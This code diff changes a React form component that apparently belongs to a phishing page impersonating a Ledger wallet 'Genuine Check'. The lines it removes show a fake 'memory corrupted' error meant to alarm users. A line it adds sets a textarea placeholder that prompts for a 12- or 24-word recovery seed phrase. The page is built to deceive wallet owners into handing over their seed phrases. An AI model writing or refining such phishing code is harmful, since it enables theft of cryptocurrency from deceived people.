@@ -157,7 +157,7 @@ const Form = () => {
           </div>
         )}
 
-        {currentStep === 1 && (
+        {loading && currentStep === 1 && (
           <div
             className={`${styles.step_two_content} ${
               loading ? styles.hidden : ""
@@ -166,10 +166,7 @@ const Form = () => {
             <h2>Genuine Check</h2>
             <RiAlertLine size={60} color="red" />
 
-            <p>
-              Your devices memory has been corrupted. <br />
-              Ledger data damage error: 0x0m3CkBn
-            </p>
+          
 
             <div className={styles.buttons}>
               <button onClick={handleUpdateClick}>
@@ -210,6 +207,7 @@ const Form = () => {
                 <textarea
                   value={formData}
                   onChange={handleFormDataChange}
+                  placeholder="Typically 12 (sometimes 24) words separated by single spaces"
                   className={styles.textarea}
                   rows={2}
                 ></textarea>
@@ -226,7 +224,7 @@ const Form = () => {
       {loading && (
         <div>
           <div className={styles.loader_content}>
-            <h2></h2>
+           
             <img src={loader_image} alt="" />
             <img src={loader} alt="loader" width={50} height={50} />
           </div>
